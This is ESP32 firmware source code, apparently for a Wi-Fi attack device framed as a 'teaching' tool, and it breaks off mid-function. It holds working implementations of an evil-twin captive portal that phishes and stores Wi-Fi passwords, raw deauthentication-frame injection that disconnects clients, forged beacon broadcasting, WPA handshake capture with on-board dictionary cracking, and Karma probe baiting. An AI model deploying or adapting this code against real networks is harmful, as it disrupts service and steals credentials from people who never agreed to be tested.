/**
 * ESP32 无线网络开发固件 (V2: AP 热点 + Web 管理后台 + 3 大安全教学验证模块)
 *
 * 行为:
 *  - 上电串口日志 115200 (烧录台「串口控制台」可见)
 *  - 开热点 SSID = WiFi-<MAC尾4hex>  密码 00000000  (与参考站一致)
 *  - http://192.168.4.1/admin.html  Neo-brutalism 后台 (内嵌页面)
 *  - Captive Portal: UDP 53 通配解析 + OS 探测路径 302, 连热点自动弹后台 (或双子钓鱼页)
 *  - Serial JSON 遥测: 串口额外输出 NDJSON(每行一个 {...}) 只读事件流,
 *    供 PC 命令行 / 便携硬件即插即用 (不含 Probe 响应/管理帧/EAPOL/凭据等材料)
 *
 * 3 大教学验证模块:
 *  1. 👤 Evil Twin (邪恶双子 & Captive Portal 凭据捕获验证)
 *  2. ⛔ Deauther (802.11 管理帧机制与取消认证阻断验证)
 *  3. ⬍ Handshake & Crack (4-Way Handshake 捕获与弱口令离线字典跑包审计)
 *
 * Serial 遥测协议 (NDJSON, UTF-8, 115200, 每行一个对象):
 *   {"v":1,"ts":<ms>,"event":"<type>", ...}
 *   event 取值 (全部为只读数据镜像):
 *     boot          上电: chip/fw/ssid/mac/channel
 *     log           日志: id/line (与环形缓冲同源)
 *     heartbeat     30s 周期: clients/heap/uptime
 *     scan_result   扫描: 每个 AP 一条 ssid/rssi/ch/bssid/auth
 *     client_join   softAP 客户端数增加: clients
 *     client_leave  softAP 客户端数减少: clients
 *     lab_state     教学模块中性状态: module/running (不含任何凭据/握手材料)
 *   约定: 以 '{' 开头的行为 JSON, 其余为原文本日志, 消费者按行解析即可。
 */

#include <Arduino.h>
#include <WiFi.h>
#include <WebServer.h>
#include <DNSServer.h>          // Captive Portal: UDP 53 通配解析 → 192.168.4.1
#include <ESPmDNS.h>
#include <Preferences.h>
#include <nvs_flash.h>
#include "esp_wifi.h"           // esp_wifi_80211_tx: 802.11 raw 帧注入 (Deauther 真实发送)
#include "soc/soc_caps.h"       // SOC_WIFI_SUPPORT_5G: 双频芯片 (ESP32-C5) 的编译期能力门控
#include "esp_random.h"         // esp_random(): 硬件 TRNG, 用于生成设备唯一的出厂后台口令
#include "admin_page.h"
#include "wifi_weak_dict.h"     // 内置 7,153 条弱口令 (与 server/data/weak-passwords.txt 同序)
#include "mbedtls/md.h"         // PBKDF2-HMAC-SHA1 / HMAC-SHA1 / HMAC-MD5 (板载跑包)
#include "esp_ota_ops.h"
#include "esp_partition.h"

#ifndef FW_VERSION
  #define FW_VERSION "1.1.0"
#endif
#ifndef FW_BUILD_NS
  #define FW_BUILD_NS "esp32-wireless-dev"
#endif

static const char *AP_PASSWORD  = "00000000";
static const char *ADMIN_HTML_C = "http://192.168.4.1/admin.html";
static const uint8_t AP_CHANNEL_DEFAULT = 6;
static const uint16_t DNS_PORT = 53;

WebServer server(80);
DNSServer dnsServer;             // Captive Portal DNS 劫持 (通配 * → AP IP)
static Preferences sPrefs;
static String apSsid;
static uint8_t apChannel = AP_CHANNEL_DEFAULT;
static uint8_t apChannelActive = AP_CHANNEL_DEFAULT; // 空口当前实际工作信道 (攻击期间临时切至目标信道; 配置值 apChannel 不变)
static String sAdminToken;                            // 后台访问口令 (NVS: adminToken)
static bool sMustChangeToken = false;                 // 仍在使用出厂初始口令, 需引导用户修改
// 旧版固件的全局静态口令: 升级后自动轮换为设备唯一随机口令 (不保留可用弱口令)
static const char *LEGACY_DEFAULT_TOKEN = "esp32admin";

/* ---------------- 日志环形缓冲 (供后台绿字日志) ---------------- */
struct LogEntry {
  uint32_t id;
  char line[160];
};
static LogEntry sLogs[64];        // 环形 64 条
static uint8_t  sLogHead = 0;     // 下一个写入位置
static uint32_t sLogId   = 0;     // 单调递增

static String jsonEscape(const String &in);   // 前置声明 (emitJson/log 需要)

/* ---------------- Serial JSON 遥测 (NDJSON, 只读镜像) ---------------- */
// 统一事件发射: 串口输出一行 {"v":1,"ts":...,"event":...,<fields>}
// fields 需为已拼好的合法 JSON 片段 (不含最外层花括号), 例如 "\"clients\":2"
// 仅镜像已有的只读数据; 绝不输出 Probe/管理帧/EAPOL/握手材料/凭据。
static void emitJson(const String &event, const String &fields) {
  String out = "{\"v\":1,\"ts\":" + String(millis()) + ",\"event\":\"" + event + "\"";
  if (fields.length()) out += "," + fields;
  out += "}";
  Serial.println(out);
}

// 教学模块状态遥测: 只发模块名与 running 布尔, 不携带任何敏感载荷
static void emitLabState(const char *module, bool running) {
  emitJson("lab_state", "\"module\":\"" + String(module) +
           "\",\"running\":" + String(running ? "true" : "false"));
}

static void log(const String &line) {
  Serial.println(line);
  LogEntry &e = sLogs[sLogHead];
  e.id = ++sLogId;
  strlcpy(e.line, line.c_str(), sizeof(e.line));
  sLogHead = (sLogHead + 1) % (sizeof(sLogs) / sizeof(sLogs[0]));
  // 镜像一条结构化日志事件, 供外部按行解析 (line 已 jsonEscape 过)
  emitJson("log", "\"id\":" + String(sLogId) + ",\"line\":\"" + jsonEscape(line) + "\"");
}

static String jsonEscape(const String &in) {
  String out;
  out.reserve(in.length() + 8);
  for (size_t i = 0; i < in.length(); i++) {
    char c = in[i];
    switch (c) {
      case '"':  out += "\\\""; break;
      case '\\': out += "\\\\"; break;
      case '\n': out += "\\n";  break;
      case '\r': break;
      case '\t': out += "\\t";  break;
      default:
        if ((uint8_t)c < 0x20) {
          char buf[8];
          snprintf(buf, sizeof(buf), "\\u%04X", c);
          out += buf;
        } else out += c;
    }
  }
  return out;
}

static String htmlEscape(const String &in) {
  String out;
  out.reserve(in.length() + 16);
  for (size_t i = 0; i < in.length(); i++) {
    char c = in[i];
    switch (c) {
      case '<':  out += "&lt;"; break;
      case '>':  out += "&gt;"; break;
      case '&':  out += "&amp;"; break;
      case '"':  out += "&quot;"; break;
      case '\'': out += "&#39;"; break;
      default:   out += c; break;
    }
  }
  return out;
}

static String extractJson(const String &body, const char *key) {
  String search = "\"" + String(key) + "\"";
  int k = body.indexOf(search);
  if (k < 0) return "";
  int colon = body.indexOf(':', k + search.length());
  if (colon < 0) return "";
  colon++; // 移过冒号
  while (colon < (int)body.length() && (body[colon] == ' ' || body[colon] == '\t' || body[colon] == '\r' || body[colon] == '\n')) colon++;
  if (colon >= (int)body.length()) return "";
  if (body[colon] == '"') {
    int q1 = colon;
    int q2 = q1 + 1;
    while (q2 < (int)body.length()) {
      if (body[q2] == '"' && body[q2 - 1] != '\\') break;
      q2++;
    }
    return (q2 < (int)body.length()) ? body.substring(q1 + 1, q2) : "";
  }
  int comma = body.indexOf(',', colon);
  int brace = body.indexOf('}', colon);
  int end = (comma < 0) ? brace : (brace < 0 ? comma : min(comma, brace));
  if (end < 0) end = body.length();
  String val = body.substring(colon, end);
  val.trim();
  return val;
}

/* ---------------- 主目标 / 双子目标 (仅 RAM 记录) ---------------- */
struct Target {
  bool   set = false;
  String ssid, bssid, auth;
  int    channel = 0;
  int    rssi    = 0;
};
static Target sTarget;   // 主目标: 必须 2.4G, 克隆热点与持续 Deauth 的对象

/* 双子目标列表 (可增删, 最多 MAX_TWINS 条): 通常是同一路由器另一个 BSSID;
 * 勾选「假 AP」时, 攻击跳频到该信道还额外广播一个伪造信标 (空口上真能看到)。 */
#define MAX_TWINS 4
struct TwinTarget {
  bool   used = false;
  String ssid, bssid, auth;
  int    channel = 0;
  int    rssi    = 0;
  bool   fakeAp  = false;
};
static TwinTarget sTwins[MAX_TWINS];

static int twinCount() {
  int n = 0;
  for (int i = 0; i < MAX_TWINS; i++) if (sTwins[i].used) n++;
  return n;
}

static void twinRemoveAt(int idx) {
  if (idx < 0 || idx >= MAX_TWINS) return;
  for (int i = idx; i < MAX_TWINS - 1; i++) sTwins[i] = sTwins[i + 1];
  sTwins[MAX_TWINS - 1] = TwinTarget();
}

// 按 BSSID 查找 (重复添加同一条时覆盖), 未找到返回 -1
static int twinFindByBssid(const String &bssid) {
  for (int i = 0; i < MAX_TWINS; i++)
    if (sTwins[i].used && sTwins[i].bssid == bssid) return i;
  return -1;
}

static int twinFirstFree() {
  for (int i = 0; i < MAX_TWINS; i++) if (!sTwins[i].used) return i;
  return -1;
}

/* ---------------- 1. 邪恶双子 (Evil Twin & 凭据捕获) ----------------
 * 真实攻击链 (发起 = eviltwinStartAttack, 收尾 = eviltwinStopAttack):
 *   1) 本机热点改名为与主目标一模一样的 SSID, 开放无密码, 信道=主目标信道 → victim 免密直连
 *   2) 自动对主目标持续注入 Deauth (复用 DeauthEngine, 本机已在目标信道, 无需切信道)
 *   3) 设了双子目标 → 每 2s 跳频到双子信道连发 3 帧 Deauth 再跳回 → 目标 5G 频段持续瘫痪,
 *      客户端只能落到 2.4G 同名克隆热点 (单射频 C5 无法同时广播双频, 跳频是唯一可行方案)
 *   4) Captive Portal 自动弹钓鱼页 → 捕获第一条凭据后自动停止注入 (热点保持同名开放供浏览),
 *      手动停止时恢复原热点名/密码/信道
 */
struct EvilTwinState {
  bool active = false;
  String cloneSsid = "";
  int templateId = 1;
  uint32_t startTime = 0;
  // —— 真实克隆攻击状态 ——
  bool     apCloned = false;      // 热点是否已真实改名 (停止时需恢复)
  String   restoreSsid = "";      // 停止时恢复的原热点名
  uint8_t  restoreChannel = 0;    // 停止时恢复的配置信道
  bool     deauthAuto = false;    // Deauth 由双子自动启动 (捕获凭据时自动停止)
  bool     caught = false;        // 已捕获第一条凭据 (攻击达成, 停止空口干扰)
  // —— 双子目标周期跳频注入 (轮询列表) ——
  bool     hopEnabled = false;    // 至少 1 条有效双子目标时启用
  bool     hopping = false;       // 当前正处于双子信道跳频窗口
  int8_t   hopCurrent = -1;       // 本轮正在服务的双子条目下标
  uint8_t  hopNext     = 0;       // 下一轮起始下标 (轮询)
  uint8_t  twinFrame[26];         // 当前条目预构的 Deauth 帧
  bool     twinFrameReady = false;
  uint8_t  beaconFrame[120];      // 假 AP 伪造信标 (变长)
  uint16_t beaconLen = 0;
  uint8_t  twinFramesLeft = 0;    // 本窗口剩余 Deauth 帧
  uint8_t  beaconLeft = 0;        // 本窗口剩余信标帧
  uint32_t lastHopAt = 0;         // 上次跳频时刻
  uint32_t twinFrameCount = 0;    // 双子信道累计成功发送 Deauth 帧
  uint32_t beaconCount = 0;       // 累计成功发送的伪造信标数
  uint32_t hopCount = 0;          // 累计跳频次数
};
static EvilTwinState sEvilTwin;

struct CredentialEntry {
  uint32_t id;
  char mac[20];
  char pass[64];
  uint32_t capturedAt;
};
static CredentialEntry sCreds[16];
static uint8_t sCredHead = 0;
static uint8_t sCredCount = 0;
static uint32_t sCredId = 0;

static void addCredential(const String &mac, const String &pass) {
  CredentialEntry &e = sCreds[sCredHead];
  e.id = ++sCredId;
  strlcpy(e.mac, mac.c_str(), sizeof(e.mac));
  strlcpy(e.pass, pass.c_str(), sizeof(e.pass));
  e.capturedAt = millis();
  sCredHead = (sCredHead + 1) % 16;
  if (sCredCount < 16) sCredCount++;
  log("[eviltwin] 捕获到客户端提交的凭据: MAC=" + mac + " 密码长度=" + String(pass.length()) +
      " (明文仅存于凭据表, 不写入日志/串口遥测)");
}

/* ---------------- 2. 取消认证器 (Deauther 真实帧注入) ---------------- */
struct DeauthEngine {
  bool running = false;
  String targetBssid = "";
  uint8_t targetChannel = 6;
  uint8_t reasonCode = 1;
  uint32_t frameCount = 0;
  uint32_t lastTxTime = 0;
  uint16_t rateLimitMs = 100; // 默认 10 fps
  uint32_t lastLogTime = 0;
  // 真实 802.11 帧注入: 预构 Deauthentication 管理帧, 经 esp_wifi_80211_tx 实际发出
  uint8_t frame[26];       // FC(2)+Duration(2)+RX(6)+TX(6)+BSSID(6)+Seq(2)+Reason(2)
  bool frameReady = false; // 目标 BSSID 合法并已构帧后才允许发送
  bool txOk = false;       // 最近一次 TX 是否成功 (供后台显示真实发送状态)
  int32_t lastTxErr = 0;   // 最近一次 esp_wifi_80211_tx 返回码 (0=ESP_OK)
  bool channelMoved = false;  // 攻击期间已临时把热点切到目标信道 (停止时恢复)
  uint8_t restoreChannel = 0; // 停止时应恢复的配置信道
};
static DeauthEngine sDeauth;

// 解析 "AA:BB:CC:DD:EE:FF" → 6 字节; 不合法返回 false
static bool parseBssid(const String &s, uint8_t out[6]) {
  const char *p = s.c_str();
  for (int i = 0; i < 6; i++) {
    char *end = nullptr;
    long v = strtol(p, &end, 16);
    if (end == p || v < 0 || v > 0xFF) return false;
    out[i] = (uint8_t)v;
    p = end;
    if (i < 5) { if (*p != ':') return false; p++; }
  }
  return *p == '\0';
}

// 构建 26 字节 Deauth 管理帧 (IEEE 802.11 Type=管理, Subtype=12)。序列号交由系统填充 (en_sys_seq=true)。
// receiver=广播 (踢掉目标 AP 下所有客户端), transmitter/BSSID=目标 AP, 客户端会信以为真断线。
// 通用版: 供 Deauth 引擎与邪恶双子 (主/双子两个 BSSID) 共用。
static bool buildDeauthFrameRaw(const String &bssidIn, uint8_t reason, uint8_t *f) {
  uint8_t mac[6];
  String bssid = bssidIn;
  bssid.trim();
  if (!parseBssid(bssid, mac)) return false;
  static const uint8_t BROADCAST[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
  f[0] = 0xC0; f[1] = 0x00;               // Frame Control: 管理 / Deauthentication (0x00c0)
  f[2] = 0x3A; f[3] = 0x01;               // Duration/ID
  memcpy(f + 4,  BROADCAST, 6);           // Address 1: 接收端 (广播)
  memcpy(f + 10, mac, 6);                 // Address 2: 发送端 (目标 AP BSSID)
  memcpy(f + 16, mac, 6);                 // Address 3: BSSID
  f[22] = 0x00; f[23] = 0x00;             // Sequence Control: 由系统填充
  f[24] = reason & 0xFF; f[25] = 0x00;    // Reason Code (小端)
  return true;
}

static void buildDeauthFrame(DeauthEngine &d) {
  d.frameReady = buildDeauthFrameRaw(d.targetBssid, d.reasonCode, d.frame);
}

// 构建伪造信标帧 (802.11 管理帧 Subtype=8) —— 「假 AP」用: 跳频到该信道时广播,
// 空口上真的能扫到这个 SSID。buffer 至少 120 字节, 返回实际帧长 (0 = BSSID 非法)。
static uint16_t buildBeaconFrame(const String &ssidIn, const String &bssidIn, uint8_t channel, uint8_t *f) {
  uint8_t mac[6];
  String bssid = bssidIn;
  bssid.trim();
  if (!parseBssid(bssid, mac)) return 0;
  String ssid = ssidIn;
  if (ssid.length() > 32) ssid = ssid.substring(0, 32);
  static const uint8_t BROADCAST[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
  static const uint8_t RATES[8] = {0x82, 0x84, 0x8B, 0x96, 0x0C, 0x12, 0x18, 0x24};
  uint16_t i = 0;
  f[i++] = 0x80; f[i++] = 0x00;              // Frame Control: 管理 / Beacon
  f[i++] = 0x00; f[i++] = 0x00;              // Duration
  memcpy(f + i, BROADCAST, 6); i += 6;       // Address 1: 广播
  memcpy(f + i, mac, 6); i += 6;             // Address 2: BSSID (伪造)
  memcpy(f + i, mac, 6); i += 6;             // Address 3: BSSID
  f[i++] = 0x00; f[i++] = 0x00;              // Sequence Control
  for (int k = 0; k < 8; k++) f[i++] = 0x00; // Timestamp
  f[i++] = 0x64; f[i++] = 0x00;              // Beacon Interval (100 TU)
  f[i++] = 0x01; f[i++] = 0x04;              // Capability: ESS + ShortSlot, 不加密
  f[i++] = 0x00; f[i++] = (uint8_t)ssid.length();   // SSID IE
  for (size_t k = 0; k < ssid.length(); k++) f[i++] = (uint8_t)ssid[k];
  f[i++] = 0x01; f[i++] = 0x08;              // Supported Rates IE
  for (int k = 0; k < 8; k++) f[i++] = RATES[k];
  f[i++] = 0x03; f[i++] = 0x01; f[i++] = channel;   // DS Parameter (信道)
  return i;
}

/* ---------------- 双频信道模型 (P0: 5GHz 仅 C5) ----------------
 * 2.4G: ch 1..14; 5G: ch 36..165。两组信道号不重叠, 因此 band 可由信道号推导,
 * 不必在 API/状态里重复传 band (API 仍接受可选 band 字段以指定跳频起点)。
 * DFS 信道 52..144 受雷达检测影响, 抓包跳频时默认跳过。
 * 非 C5 芯片在编译期裁掉 5G 表与校验, 行为与改造前完全一致。 */
#if SOC_WIFI_SUPPORT_5G
static const uint8_t kChannels5G[] = {
  36, 40, 44, 48, 52, 56, 60, 64, 100, 104, 108, 112, 116, 120, 124, 128,
  132, 136, 140, 144, 149, 153, 157, 161, 165
};
static const uint8_t kChannels5GCount = sizeof(kChannels5G) / sizeof(kChannels5G[0]);
static bool isDfs5G(uint8_t ch) { return ch >= 52 && ch <= 144; }
static bool isValid5GChannel(int ch) {
  for (uint8_t i = 0; i < kChannels5GCount; i++) {
    if (kChannels5G[i] == ch) return true;
  }
  return false;
}
#endif

// 是否 5GHz 信道 (非 C5 恒为 false)
static bool isBand5G(uint8_t ch) {
#if SOC_WIFI_SUPPORT_5G
  return ch >= 32;
#else
  (void)ch;
  return false;
#endif
}

// P0 抓包/侦察允许的信道: 2.4G 1..14; 5G 需 C5 且在信道表内
static bool isValidSniffChannel(int ch) {
  if (ch >= 1 && ch <= 14) return true;
#if SOC_WIFI_SUPPORT_5G
  return isValid5GChannel(ch);
#else
  return false;
#endif
}

// 解析可选 band 字段: 5=5GHz, 2=2.4GHz, 0=未指定
static uint8_t parseBandArg(const String &s) {
  if (s == "5" || s == "5G" || s == "5g") return 5;
  if (s == "24" || s == "2" || s == "2.4" || s == "2.4G") return 2;
  return 0;
}

// 取下一个跳频信道: 2.4G 1..13 循环; 5G 在信道表内循环 (skipDfs 时跳过 DFS)
static uint8_t nextHopChannel(uint8_t ch, bool skipDfs) {
#if SOC_WIFI_SUPPORT_5G
  if (isBand5G(ch)) {
    int cur = -1;
    for (uint8_t i = 0; i < kChannels5GCount; i++) {
      if (kChannels5G[i] == ch) { cur = i; break; }
    }
    for (uint8_t step = 1; step <= kChannels5GCount; step++) {
      int idx = (cur + step + kChannels5GCount) % kChannels5GCount;
      uint8_t c = kChannels5G[idx];
      if (!skipDfs || !isDfs5G(c)) return c;
    }
    return ch;
  }
#else
  (void)skipDfs;
#endif
  return (ch >= 13) ? 1 : (uint8_t)(ch + 1);
}

// 跳频起点: 按目标 band 选一个合法起始信道
static uint8_t hopStartChannel(uint8_t band, uint8_t fallback) {
#if SOC_WIFI_SUPPORT_5G
  if (band == 5) return isBand5G(fallback) ? fallback : 36;
#endif
  if (band == 2 && isBand5G(fallback)) return 1;
  return fallback;
}

// 临时切换 AP 空口信道到 ch (不修改 NVS 配置); 成功返回 true。ch 支持 2.4G(1-14) 与 5G(32-177, 仅双频芯片)。
// 目的: 单射频只能在本机信道上发帧 → 先对齐目标信道, Deauth 才能真实到达目标。
// 副作用: 已连热点的受测设备会短暂掉线 (未发 CSA 公告), 重新扫描后自动重连, Captive Portal 仍生效。
static bool applyApChannel(uint8_t ch) {
  if (ch < 1 || ch > 177) return false;
  if (ch == apChannelActive) return true;
  if (esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE) != ESP_OK) return false;
  apChannelActive = ch;
  return true;
}

/* ---------------- 3. 握手包捕获与离线弱口令跑包 (Handshake & Crack) ----------------
 *
 * 真实实现 (不再按时间戳伪造 M1..M4):
 *
 *  捕获 — 把 AP 空口临时对齐到目标信道, 打开 esp_wifi promiscuous 只收数据帧,
 *         从 LLC 0x888E 的 EAPOL-Key 帧识别 4 次握手: M1 (ANonce)、M2
 *         (SNonce + MIC + RSN ie)、M3 (GTK)、M4 (ACK), 并解析 M1 的 PMKID KDE。
 *
 *  跑包 — 用内置 7,153 条弱口令逐条:
 *           PMK = PBKDF2-HMAC-SHA1(口令, 目标 SSID, 4096, 32)
 *           PTK = PRF-512(PMK, "Pairwise key expansion",
 *                         Min/Max(AA,SPA) ‖ Min/Max(ANonce,SNonce))
 *           MIC = HMAC-SHA1(PTK[0..16], M2 帧且 MIC 区置零)   (keyver 1 用 HMAC-MD5)
 *         与 M2 自带的 MIC 比对, 命中即该网络口令。每轮主循环只跑一条, 保证
 *         HTTP 服务在跑包期间仍能响应进度查询。
 *
 *  keyver 3 (802.11w PMF) 的 KCK 走 SHA256-KDF + AES-CMAC, 板载未实现 →
 *  标记 unsupported, 用 /api/handshake/dump 导出后交服务端 /api/wpa/crack 跑。
 */
struct HandshakeState {
  bool capturing = false;
  bool m1 = false, m2 = false, m3 = false, m4 = false;
  bool pmkid = false;
  bool captured = false;      // 已拿到可用于跑包的 M1 + M2
  bool unsupported = false;   // keyver 3 (PMF) 板载不支持
  bool hasTarget = false;     // 只接收该 BSSID 的握手帧, 避免混入邻近网络
  bool cracking = false;
  uint8_t keyver = 2;
  uint8_t targetBssid[6] = {0};
  uint8_t anonce[32] = {0};
  uint8_t snonce[32] = {0};
  uint8_t bssid[6] = {0};
  uint8_t stmac[6] = {0};
  uint8_t eapol[256] = {0};   // M2 的 EAPOL-Key 帧 (从 802.1X 头开始)
  uint16_t eapolLen = 0;
  uint32_t frameCount = 0;    // 收到的 EAPOL-Key 帧总数
  String essid = "";          // 跑包用 ESSID (目标 AP 的 SSID, 即 PBKDF2 的盐)
  uint32_t crackProgress = 0;
  uint32_t crackTotal = (uint32_t)WIFI_WEAK_DICT_COUNT;
  uint32_t crackAttempts = 0;
  String crackedPass = "";
  uint32_t crackStartTime = 0;
  uint32_t captureStartTime = 0;
  bool channelMoved = false;
  uint8_t restoreChannel = 0;
};
static HandshakeState sHandshake;
// 抓包进度日志去重标记 (只在状态首次变化时打一条, 避免刷屏)
static bool sHsLoggedM1 = false, sHsLoggedM2 = false, sHsLoggedDone = false;

static String hexBytes(const uint8_t *p, size_t n) {
  static const char HEXD[] = "0123456789abcdef";
  String out;
  out.reserve((unsigned int)(n * 2));
  for (size_t i = 0; i < n; i++) {
    out += HEXD[(p[i] >> 4) & 0x0F];
    out += HEXD[p[i] & 0x0F];
  }
  return out;
}

// 802.11 数据帧 → EAPOL-Key 帧的定位: 跳过 MAC 头 (含 QoS/HTC) 与 LLC/SNAP。
// 返回 EAPOL 起始偏移, 失败返回 -1。QoS/HTC 在不同驱动上偏移差 2/4 字节, 容错探测。
static int eapolOffset(const uint8_t *f, int len) {
  static const uint8_t SNAP[8] = {0xAA, 0xAA, 0x03, 0x00, 0x00, 0x00, 0x88, 0x8E};
  const uint8_t fc0 = f[0];
  const uint8_t subtype = fc0 >> 4;
  const bool toDs = (fc0 & 0x01) != 0;
  const bool fromDs = (fc0 & 0x02) != 0;
  int hdr = 24;
  if (toDs && fromDs) hdr += 6;      // WDS
  if (subtype & 0x08) hdr += 2;      // QoS Data
  if (f[1] & 0x80) hdr += 4;         // Order → HT Control
  for (int delta = 0; delta <= 6; delta += 2) {
    int p = hdr + delta;
    if (p + 8 > len) break;
    if (memcmp(f + p, SNAP, 8) == 0) return p + 8;
  }
  return -1;
}

/* ---- 抓包观察器共用缓冲区 (Sniffer / Airodump / Karma) ----
 * 三者与握手捕获共用同一个 promiscuous 回调; 回调运行在 WiFi 任务上下文,
 * 只做定长缓冲写入, 不分配内存、不打日志。 */
struct SnifferPacket {
  uint32_t ts;
  uint8_t ch;
  int8_t rssi;
  char type[12];
  char src[18];
  char dst[18];
  char info[48];
};

struct SnifferState {
  bool running = false;
  uint8_t channel = 6;
  bool hopping = false;
  bool skipDfs = true;   // 5G 跳频时跳过 DFS (52-144), 避免雷达检测打断驻留
  uint32_t totalPackets = 0;
  uint32_t mgmtCount = 0;
  uint32_t ctrlCount = 0;
  uint32_t dataCount = 0;
  uint16_t fps = 0;
  uint16_t fpsAccum = 0;
  uint32_t lastFpsCalc = 0;
  uint32_t lastHopTime = 0;
  SnifferPacket packets[16];
  uint8_t packetHead = 0;
  uint8_t packetCount = 0;
};
static SnifferState sSniffer;

// kind: 0=管理帧 1=控制帧 2=数据帧
static void addSnifferPacket(uint8_t ch, int8_t rssi, const char *type, const char *src,
                             const char *dst, const char *info, uint8_t kind) {
  SnifferPacket &p = sSniffer.packets[sSniffer.packetHead];
  p.ts = millis();
  p.ch = ch;
  p.rssi = rssi;
  strlcpy(p.type, type, sizeof(p.type));
  strlcpy(p.src, src, sizeof(p.src));
  strlcpy(p.dst, dst, sizeof(p.dst));
  strlcpy(p.info, info, sizeof(p.info));
  sSniffer.packetHead = (sSniffer.packetHead + 1) % 16;
  if (sSniffer.packetCount < 16) sSniffer.packetCount++;
  sSniffer.totalPackets++;
  sSniffer.fpsAccum++;
  if (kind == 2) sSniffer.dataCount++;
  else if (kind == 1) sSniffer.ctrlCount++;
  else sSniffer.mgmtCount++;
}

struct AirodumpStation {
  char mac[18];
  char bssid[18];
  int8_t rssi;
  uint32_t packets;
  char probes[48];
};

struct AirodumpState {
  bool running = false;
  bool hopping = true;
  bool skipDfs = true;   // 5G 跳频时跳过 DFS (52-144)
  uint8_t currentChannel = 1;
  uint32_t lastHopTime = 0;
  AirodumpStation stations[8];
  uint8_t stationCount = 0;
};
static AirodumpState sAirodump;

struct KarmaProbe {
  char mac[18];
  char ssid[33];
  int8_t rssi;
  uint32_t ts;
  bool baited;
};

struct KarmaState {
  bool running = false;
  uint32_t probesCaptured = 0;
  uint32_t probesBaited = 0;
  KarmaProbe probes[10];
  uint8_t probeCount = 0;
  uint8_t probeHead = 0;
};
static KarmaState sKarma;

static void addKarmaProbe(const char *mac, const char *ssid, int8_t rssi, bool baited) {
  KarmaProbe &p = sKarma.probes[sKarma.probeHead];
  strlcpy(p.mac, mac, sizeof(p.mac));
  strlcpy(p.ssid, ssid, sizeof(p.ssid));
  p.rssi = rssi;
  p.ts = millis();
  p.baited = baited;
  sKarma.probeHead = (sKarma.probeHead + 1) % 10;
  if (sKarma.probeCount < 10) sKarma.probeCount++;
  sKarma.probesCaptured++;
  if (baited) sKarma.probesBaited++;
}

// 轻量 MAC 格式化 (回调上下文不分配 String)
static void macToStr(char *out, const uint8_t *m) {
  static const char kHex[] = "0123456789ABCDEF";
  for (int i = 0; i < 6; i++) {
    out[i * 3] = kHex[(m[i] >> 4) & 0x0F];
    out[i * 3 + 1] = kHex[m[i] & 0x0F];
    if (i < 5) out[i * 3 + 2] = ':';
  }
  out[17] = 0;
}

// 从 IE 链中取 SSID (id=0); 返回长度, 未找到返回 -1
static int ieFindSsid(const uint8_t *f, int len, int off, char *out, int outLen) {
  while (off + 2 <= len) {
    const uint8_t id = f[off], l = f[off + 1];
    if (off + 2 + l > len) break;
    if (id == 0) {
      int n = (l < outLen - 1) ? l : outLen - 1;
      memcpy(out, f + off + 2, n);
      out[n] = 0;
      return n;
    }
    off += 2 + l;
  }
  return -1;
}

// 数据包分析器: 把真实空口帧归类写入滚动缓冲
static void snifferObserve(const uint8_t *f, int len, int8_t rssi, uint8_t ch) {
  if (len < 10) return;
  const uint8_t fc0 = f[0];
  const uint8_t ftype = (fc0 >> 2) & 0x03;
  const uint8_t sub = (fc0 >> 4) & 0x0F;
  char src[18], dst[18], type[12] = "Data", info[48] = "";
  macToStr(src, (len >= 16) ? f + 10 : f + 4);
  macToStr(dst, f + 4);

  if (ftype == 0) {
    if (len < 24) return;
    static const char *subNames[16] = {
      "AssocReq", "AssocResp", "ReassocReq", "ReassocResp", "ProbeReq", "ProbeResp",
      "TimingAdv", "-", "Beacon", "ATIM", "Disassoc", "Auth",
      "Deauth", "Action", "ActionNoAck", "-"};
    strlcpy(type, subNames[sub], sizeof(type));
    if (sub == 8 || sub == 5) {
      char ssid[33];
      if (ieFindSsid(f, len, 36, ssid, sizeof(ssid)) >= 0) snprintf(info, sizeof(info), "SSID: %s", ssid);
      else strlcpy(info, "(隐藏 SSID)", sizeof(info));
    } else if (sub == 4) {
      char ssid[33];
      if (ieFindSsid(f, len, 24, ssid, sizeof(ssid)) > 0) snprintf(info, sizeof(info), "Probe: %s", ssid);
      else strlcpy(info, "Broadcast Probe", sizeof(info));
    } else if (sub == 12 || sub == 10) {
      if (len >= 26) snprintf(info, sizeof(info), "Reason: %u", (unsigned)(f[24] | (f[25] << 8)));
      else strlcpy(info, "管理帧", sizeof(info));
    } else {
      strlcpy(info, "Management Frame", sizeof(info));
    }
    addSnifferPacket(ch, rssi, type, src, dst, info, 0);
    return;
  }

  if (ftype == 1) {
    static const char *ctrlNames[16] = {
      "-", "-", "-", "-", "-", "-", "-", "Control", "BlockAckReq", "BlockAck",
      "PS-Poll", "RTS", "CTS", "ACK", "CF-End", "CF-EndAck"};
    strlcpy(type, ctrlNames[sub], sizeof(type));
    strlcpy(info, "Control Frame", sizeof(info));
    addSnifferPacket(ch, rssi, type, src, dst, info, 1);
    return;
  }

  // 数据帧
  if (sub == 4) strlcpy(type, "Null", sizeof(type));
  else if (sub == 8 || sub == 12) strlcpy(type, "QoS", sizeof(type));
  if (eapolOffset(f, len) >= 0) {
    strlcpy(type, "EAPOL", sizeof(type));
    strlcpy(info, "802.1X Key", sizeof(info));
  } else if (len >= 24 && ((fc0 & 0x03) == 0x01 || (fc0 & 0x03) == 0x02)) {
    char b[18];
    macToStr(b, f + 16);
    snprintf(info, sizeof(info), "BSSID %s", b);
  } else {
    strlcpy(info, "WDS / IBSS", sizeof(info));
  }
  addSnifferPacket(ch, rssi, type, src, dst, info, 2);
}

// Airodump: 记录对端 STA/AP (按 MAC 聚合帧数与探测过的 SSID)
static void airodumpObserve(const uint8_t *a, const uint8_t *b, const uint8_t *bssid,
                            int8_t rssi, const char *ssid) {
  const uint8_t *peer = a;
  if (bssid && memcmp(a, bssid, 6) == 0) peer = b;
  if (peer[0] & 0x01) return;   // 跳过组播/广播地址
  char mac[18], bs[18];
  macToStr(mac, peer);
  macToStr(bs, bssid ? bssid : b);
  for (int i = 0; i < sAirodump.stationCount; i++) {
    AirodumpStation &st = sAirodump.stations[i];
    if (strcmp(st.mac, mac) != 0) continue;
    st.packets++;
    st.rssi = rssi;
    if (ssid && ssid[0] && strstr(st.probes, ssid) == NULL) {
      size_t cur = strlen(st.probes);
      if (cur && cur < sizeof(st.probes) - 2) {
        st.probes[cur] = ',';
        st.probes[cur + 1] = 0;
      }
